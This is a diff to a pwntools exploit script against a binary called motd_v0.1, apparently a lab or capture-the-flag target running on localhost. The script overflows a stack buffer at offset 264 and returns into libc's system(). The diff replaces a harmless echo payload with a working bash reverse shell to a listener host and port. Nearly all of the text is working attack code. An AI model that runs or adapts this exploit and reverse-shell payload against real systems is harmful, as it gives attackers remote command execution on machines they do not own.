@@ -32,8 +32,9 @@ Explanation:
 """
 
 REMOTE = ('127.0.0.1', 3001) # Remote to exploit or None
+# REMOTE = None
 TARGET = '../bin/motd_v0.1' # Local binary path (must be identical on server)
-LHOST  = "172.17.0.1"        # Reverse shell host
+LHOST  = "10.0.0.105"        # Reverse shell host
 LPORT  = "8888"             # Reverse shell port
 DEBUG  = False              # Follow along in GDB
 
@@ -46,18 +47,18 @@ elf = ELF(TARGET)
 # pattern_offset -l 1000 -q 0x6a41396941386941
 OFFSET = 264         # [*] Exact match at offset 264
 system = elf.symbols['system']
-print(hex(system))
 SYSTEM = q(system)
 
 if PATTERN_ONLY:
     PAYLOAD = PATTERN
 else:
     # Store payload on stack. it can't be directly executed though due to NX
-    PAYLOAD = "echo hello > /dev/tcp/{}/{} 0>&1\x00".format(LHOST, LPORT)
+    PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1\x00".format(LHOST, LPORT)
     # First A to fix alignment because rdi points to rsp+1
     PAYLOAD = "A" + PAYLOAD + "A" * (OFFSET - len(PAYLOAD) - 1)
     # Directly call libc's system()
     PAYLOAD += SYSTEM # ret2libc
+    print PAYLOAD.encode('hex')
 
 if not DEBUG:
     p = process(TARGET) if REMOTE is None else remote(*REMOTE)
@@ -69,8 +70,6 @@ else: # Follow along in gdb
     ''')
 
 # Set motd
-p.recvuntil("> ")
 p.sendline("2")
-p.recvuntil("> ")
 p.sendline(PAYLOAD)
 print p.readall()
